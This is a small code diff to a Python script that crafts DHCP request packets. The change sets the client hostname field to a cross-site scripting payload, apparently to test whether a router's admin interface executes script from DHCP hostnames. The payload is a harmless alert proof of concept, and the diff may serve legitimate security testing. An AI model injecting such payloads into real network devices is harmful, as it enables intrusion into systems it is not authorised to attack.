@@ -4,7 +4,7 @@ import time
 from enum import IntEnum
 
 
-interface = 'wlx00c0ca84aba2'
+interface = 'wlx00'
 mac = '00:c0:ca:84:ab:a2'
 broadcast = 'ff:ff:ff:ff:ff:ff'
 mac_hex = mac.replace(':', '').decode('hex')
@@ -33,7 +33,7 @@ def dhcp_request(pkt):
     yiaddr = pkt['BOOTP'].yiaddr
     siaddr = '192.168.0.1'
     param_req_list = []
-    hostname = "Test"
+    hostname = "<script>alert('xss')</script>"
 
     req_pkt =  Ether(src=mac, dst=broadcast)  / \
                IP(src='0.0.0.0', dst='255.255.255.255')  / \
